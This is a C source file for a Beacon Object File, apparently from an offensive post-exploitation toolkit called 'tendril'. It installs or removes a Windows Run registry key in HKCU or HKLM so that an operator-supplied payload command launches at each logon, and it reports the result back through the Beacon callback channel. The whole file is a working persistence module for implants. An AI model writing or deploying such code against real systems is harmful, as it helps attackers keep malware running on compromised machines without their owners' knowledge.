/*
 * tendril-registry-run BOF
 * Registry Run key persistence (HKCU or HKLM)
 *
 * Arguments (packed):
 *   wstr valueName - Run key value name
 *   wstr payload   - command to execute
 *   short hive     - 0 = HKCU, 1 = HKLM
 *   short action   - 0 = install, 1 = remove
 */
#include "tendril.h"

#define RUN_KEY L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"

void go(char* args, int alen)
{
    datap parser;
    BeaconDataParse(&parser, args, alen);

    int nameLen, payloadLen;
    wchar_t* valueName = (wchar_t*)BeaconDataExtract(&parser, &nameLen);
    wchar_t* payload   = (wchar_t*)BeaconDataExtract(&parser, &payloadLen);
    short hive   = BeaconDataShort(&parser);
    short action = BeaconDataShort(&parser);

    HKEY root = (hive == 1) ? HKEY_LOCAL_MACHINE : HKEY_CURRENT_USER;
    char* hiveName = (hive == 1) ? "HKLM" : "HKCU";

    if (action == 0) /* install */
    {
        LSTATUS s = tendril_reg_set_sz(root, RUN_KEY, valueName, payload);
        if (s == ERROR_SUCCESS)
            BeaconPrintf(CALLBACK_OUTPUT, "[+] Run key set: %s\\...\\Run\\%ls = %ls", hiveName, valueName, payload);
        else
            BeaconPrintf(CALLBACK_ERROR, "[-] Failed to set Run key: %d", s);
    }
    else /* remove */
    {
        LSTATUS s = tendril_reg_delete_value(root, RUN_KEY, valueName);
        if (s == ERROR_SUCCESS)
            BeaconPrintf(CALLBACK_OUTPUT, "[+] Run key removed: %ls", valueName);
        else
            BeaconPrintf(CALLBACK_ERROR, "[-] Failed to remove Run key: %d", s);
    }
}
